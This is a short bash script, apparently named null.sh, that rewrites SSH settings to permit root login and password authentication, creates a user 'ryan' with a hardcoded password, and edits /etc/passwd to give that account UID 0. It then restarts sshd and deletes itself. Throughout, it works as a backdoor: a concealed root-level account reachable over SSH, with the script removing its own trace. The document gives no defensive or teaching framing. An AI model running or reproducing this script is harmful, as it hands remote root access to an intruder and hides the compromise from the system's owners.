#!/bin/bash

sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
echo "Port 22"  >> /etc/ssh/sshd_config
useradd ryan
echo ryan:Ryan1995 |chpasswd ryan
sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
service sshd restart

rm -f null.sh
